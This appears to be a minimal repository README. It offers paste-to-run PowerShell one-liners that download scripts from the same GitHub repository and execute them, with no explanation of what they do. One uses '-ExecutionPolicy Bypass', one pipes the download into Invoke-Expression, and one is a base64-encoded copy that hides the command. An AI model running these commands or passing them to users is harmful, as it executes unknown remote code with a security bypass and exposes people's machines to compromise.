# future

gg
```ps1
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $tempPath = Join-Path $env:TEMP 'run.ps1'; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/yourname1204/future/master/run.ps1' -OutFile $tempPath; Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File $tempPath" -Wait; Remove-Item $tempPath -Force
```
```
powershell -eC WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACAAJAB0AGUAbQBwAFAAYQB0AGgAIAA9ACAASgBvAGkAbgAtAFAAYQB0AGgAIAAkAGUAbgB2ADoAVABFAE0AUAAgACcAcgB1AG4ALgBwAHMAMQAnADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHkAbwB1AHIAbgBhAG0AZQAxADIAMAA0AC8AZgB1AHQAdQByAGUALwBtAGEAcwB0AGUAcgAvAHIAdQBuAC4AcABzADEAJwAgAC0ATwB1AHQARgBpAGwAZQAgACQAdABlAG0AcABQAGEAdABoADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcABvAHcAZQByAHMAaABlAGwAbAAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACQAdABlAG0AcABQAGEAdABoACIAIAAtAFcAYQBpAHQAOwAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAdABlAG0AcABQAGEAdABoACAALQBGAG8AcgBjAGUA
```
uk
```ps1
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Expression "& { $(Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/yourname1204/future/master/run2.ps1') }"
```
